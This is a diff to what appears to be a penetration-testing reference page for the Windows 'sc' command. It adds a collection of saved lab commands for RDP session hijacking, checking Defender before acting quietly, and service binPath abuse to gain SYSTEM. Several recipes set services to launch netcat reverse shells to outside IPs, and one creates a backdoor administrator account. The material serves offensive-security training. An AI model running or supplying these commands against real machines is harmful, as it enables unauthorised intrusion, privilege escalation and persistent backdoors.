@@ -11,6 +11,8 @@ hideFooterPagination: true
 
 Replace UPPER_CASE values with your lab values.
 
+[Search this tool’s saved examples](/commands/notebook?tool=sc) · [All tools](/index)
+
 ## List services
 
 **Windows — cmd.exe or PowerShell**
@@ -49,8 +51,211 @@ Displays SDDL for the service object; the binary file has separate permissions.
 
 [Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
 
-[More saved commands for this tool](https://dashboard-aed21664.mintlify.site/find-anything?q=sc)
+## Notebook recipes
 
-## Learning and original examples
+11 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
-- [Windows Privilege Escalation: Full Checklist](/privesc/windows-privesc-checklist)
+<AccordionGroup>
+
+<Accordion title="RDP Session Hijacking">
+
+### RDP Session Hijacking
+
+**Attacking RDP: Module Notes**
+
+```batch
+C:\htb> query user
+
+ USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
+>juurena               rdp-tcp#13          1  Active          7  8/25/2021 1:23 AM
+ lewen                 rdp-tcp#14          2  Active          *  8/25/2021 1:28 AM
+
+C:\htb> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
+
+[SC] CreateService SUCCESS
+
+PowerShell session displaying user queries and service creation command with success message.
+```
+
+**Common Services: Full Module Reference**
+
+```cmd
+C:\htb> query user
+
+ USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
+>juurena               rdp-tcp#13          1  Active          7  8/25/2021 1:23 AM
+ lewen                 rdp-tcp#14          2  Active          *  8/25/2021 1:28 AM
+
+C:\htb> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
+
+[SC] CreateService SUCCESS
+```
+
+</Accordion>
+
+<Accordion title="3. Checking Defenses">
+
+### 3. Checking Defenses
+
+**Enumerate Active Directory with Built-in Tools**
+
+```cmd
+sc query windefend
+```
+
+</Accordion>
+
+<Accordion title="Defenses present (decide if you need to be quiet)">
+
+### Defenses present (decide if you need to be quiet)
+
+**Windows Post-Exploitation: Field Reference**
+
+```cmd
+sc query windefend                           :: Defender running?
+Get-MpComputerStatus | ft RealTimeProtection*, AMSIEnabled    (PowerShell)
+netsh advfirewall show allprofiles
+```
+
+</Accordion>
+
+<Accordion title="E. Service &amp; path abuse (normal-user → SYSTEM)">
+
+### E. Service & path abuse (normal-user → SYSTEM)
+
+**Windows Post-Exploitation: Field Reference**
+
+```cmd
+sc qc <service>                                  :: inspect
+sc config <service> binPath= "C:\Temp\rev.exe"   :: if you have SERVICE_CHANGE_CONFIG
+sc stop <service> & sc start <service>
+:: PowerUp automates discovery + abuse:
+powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"
+```
+
+</Accordion>
+
+<Accordion title="EoP - Incorrect permissions in services">
+
+### EoP - Incorrect permissions in services
+
+**Windows Privilege Escalation: Full Checklist**
+
+```powershell
+$ for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt
+$ for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"
+
+$ sc query state=all | findstr "SERVICE_NAME:" >> Servicenames.txt
+FOR /F %i in (Servicenames.txt) DO echo %i
+type Servicenames.txt
+FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt
+FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt
+```
+
+</Accordion>
+
+<Accordion title="EoP - Processes Enumeration and Tasks">
+
+### EoP - Processes Enumeration and Tasks
+
+**Windows Privilege Escalation: Full Checklist**
+
+```powershell
+tasklist /v
+net start
+sc query
+Get-Service
+Get-Process
+Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize
+```
+
+</Accordion>
+
+<Accordion title="Example with Windows 10 - CVE-2019-1322 UsoSvc">
+
+### Example with Windows 10 - CVE-2019-1322 UsoSvc
+
+**Windows Privilege Escalation: Full Checklist**
+
+```powershell
+PS C:\Windows\system32> sc.exe stop UsoSvc
+PS C:\Windows\system32> sc.exe config usosvc binPath="C:\Windows\System32\spool\drivers\color\nc.exe 10.10.10.10 4444 -e cmd.exe"
+PS C:\Windows\system32> sc.exe config UsoSvc binpath= "C:\Users\mssql-svc\Desktop\nc.exe 10.10.10.10 4444 -e cmd.exe"
+PS C:\Windows\system32> sc.exe config UsoSvc binpath= "cmd /C C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"
+PS C:\Windows\system32> sc.exe qc usosvc
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: usosvc
+        TYPE               : 20  WIN32_SHARE_PROCESS 
+        START_TYPE         : 2   AUTO_START  (DELAYED)
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Users\mssql-svc\Desktop\nc.exe 10.10.10.10 4444 -e cmd.exe
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : Update Orchestrator Service
+        DEPENDENCIES       : rpcss
+        SERVICE_START_NAME : LocalSystem
+
+PS C:\Windows\system32> sc.exe start UsoSvc
+```
+
+</Accordion>
+
+<Accordion title="Example with Windows XP SP1 - upnphost">
+
+### Example with Windows XP SP1 - upnphost
+
+**Windows Privilege Escalation: Full Checklist**
+
+```powershell
+# NOTE: spaces are mandatory for this exploit to work !
+sc config upnphost binpath= "C:\Inetpub\wwwroot\nc.exe 10.11.0.73 4343 -e C:\WINDOWS\System32\cmd.exe"
+sc config upnphost obj= ".\LocalSystem" password= ""
+sc qc upnphost
+sc config upnphost depend= ""
+net start upnphost
+```
+
+**Windows Privilege Escalation: Full Checklist**
+
+```powershell
+sc config SSDPSRV start=auto
+net start SSDPSRV
+net stop upnphost
+net start upnphost
+
+sc config upnphost depend=""
+```
+
+**Windows Privilege Escalation: Full Checklist**
+
+```powershell
+$ accesschk.exe -uwcqv "Authenticated Users" * /accepteula
+RW SSDPSRV
+        SERVICE_ALL_ACCESS
+RW upnphost
+        SERVICE_ALL_ACCESS
+
+$ accesschk.exe -ucqv upnphost
+upnphost
+  RW NT AUTHORITY\SYSTEM
+        SERVICE_ALL_ACCESS
+  RW BUILTIN\Administrators
+        SERVICE_ALL_ACCESS
+  RW NT AUTHORITY\Authenticated Users
+        SERVICE_ALL_ACCESS
+  RW BUILTIN\Power Users
+        SERVICE_ALL_ACCESS
+
+$ sc config <vuln-service> binpath="net user backdoor backdoor123 /add"
+$ sc config <vuln-service> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
+$ sc stop <vuln-service>
+$ sc start <vuln-service>
+$ sc config <vuln-service> binpath="net localgroup Administrators backdoor /add"
+$ sc stop <vuln-service>
+$ sc start <vuln-service>
+```
+
+</Accordion>
+
+</AccordionGroup>
